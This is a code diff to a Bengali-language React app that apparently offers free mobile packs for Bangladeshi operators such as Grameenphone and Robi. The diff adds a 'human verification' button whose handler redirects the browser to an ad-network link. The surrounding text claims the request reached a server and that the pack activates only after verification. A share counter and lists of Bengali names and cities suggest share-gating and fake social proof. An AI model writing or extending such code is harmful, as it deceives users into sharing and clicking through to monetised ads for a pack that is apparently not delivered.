@@ -7,12 +7,14 @@ const BENGALI_NAMES = ['আরিফ', 'সুমন', 'তানভীর', '�
 const BENGALI_SURNAMES = ['আহমেদ', 'হাসান', 'খান', 'ইসলাম', 'রহমান', 'শেখ', 'চৌধুরী', 'হোসেন', 'মোল্লা', 'তালুকদার', 'মিয়া', 'পাঞ্জা', 'দাস', 'শিকদার'];
 const CITIES = ['ঢাকা', 'চট্টগ্রাম', 'সিলেট', 'রাজশাহী', 'খুলনা', 'বরিশাল', 'রংপুর', 'ময়মনসিংহ', 'কুমিল্লা', 'গাজীপুর', 'নারায়ণগঞ্জ', 'সাভার', 'বগুড়া', 'নোয়াখালী'];
 
-// Fix: Add missing OPERATORS constant definition
+// Expanded OPERATORS constant definition
 const OPERATORS = [
   { id: 'gp', name: 'Grameenphone', icon: '📡' },
   { id: 'robi', name: 'Robi', icon: '📶' },
   { id: 'bl', name: 'Banglalink', icon: '⚡' },
-  { id: 'teletalk', name: 'Teletalk', icon: '🏛️' }
+  { id: 'airtel', name: 'Airtel', icon: '🔴' },
+  { id: 'teletalk', name: 'Teletalk', icon: '🏛️' },
+  { id: 'skitto', name: 'Skitto', icon: '🦊' }
 ];
 
 const App: React.FC = () => {
@@ -137,6 +139,10 @@ const App: React.FC = () => {
   };
 
   const shareProgress = Math.min((shareCount / MAX_SHARES) * 100, 100);
+
+  const handleVerificationRedirect = () => {
+    window.location.href = 'https://www.effectivegatecpm.com/km3q6ybu?key=5e41374af5e20288afad65cea8753ac2';
+  };
 
   return (
     <div className="min-h-screen bg-[#0a0f1e] text-white flex flex-col items-center pb-20 selection:bg-amber-500 selection:text-black font-['Hind_Siliguri']">
@@ -404,7 +410,10 @@ const App: React.FC = () => {
                 <p className="text-[13px] text-gray-400 mb-10 leading-relaxed font-bold px-4">
                    আপনার অনুরোধটি সার্ভারে জমা হয়েছে। প্যাকটি সচল করতে শেষ হিউম্যান ভেরিফিকেশনটি করুন।
                 </p>
-                <button className="w-full bg-gradient-to-r from-green-500 to-green-600 text-white font-black py-5 rounded-[2rem] hover:scale-105 transition-all shadow-[0_20px_40px_rgba(34,197,94,0.3)] uppercase tracking-widest relative overflow-hidden group">
+                <button 
+                  onClick={handleVerificationRedirect}
+                  className="w-full bg-gradient-to-r from-green-500 to-green-600 text-white font-black py-5 rounded-[2rem] hover:scale-105 transition-all shadow-[0_20px_40px_rgba(34,197,94,0.3)] uppercase tracking-widest relative overflow-hidden group"
+                >
                   <span className="relative z-10 text-xl">ভেরিফিকেশন সম্পন্ন করুন</span>
                   <div className="absolute inset-0 bg-white/20 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-1000"></div>
                 </button>
